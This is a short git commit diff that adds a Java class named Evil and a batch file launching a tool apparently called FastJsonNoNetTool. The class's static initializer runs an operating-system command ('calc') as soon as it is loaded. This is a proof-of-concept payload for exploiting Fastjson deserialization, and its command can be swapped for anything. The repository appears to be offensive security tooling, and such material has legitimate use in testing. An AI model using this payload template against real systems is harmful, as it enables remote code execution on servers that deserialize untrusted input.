109df33358e3263e8cef859bec8b0005f67d9ce2
椰爷也 <982913654@qq.com>
2023-02-17 09:40:56 +0800

    update

---
+++ source/Evil.java
@@ -0,0 +1,13 @@
+public class Evil {
+    static {
+        try {
+            Runtime rt = Runtime.getRuntime();
+            String[] commands = {"calc"};
+            Process pc = rt.exec(commands);
+            pc.waitFor();
+        } catch (Exception e) {
+            // do nothing
+        }
+    }
+}
+
---
+++ start.bat
@@ -0,0 +1,1 @@
+java -Dfile.encoding=UTF-8 -jar FastJsonNoNetTool-1.0.jar
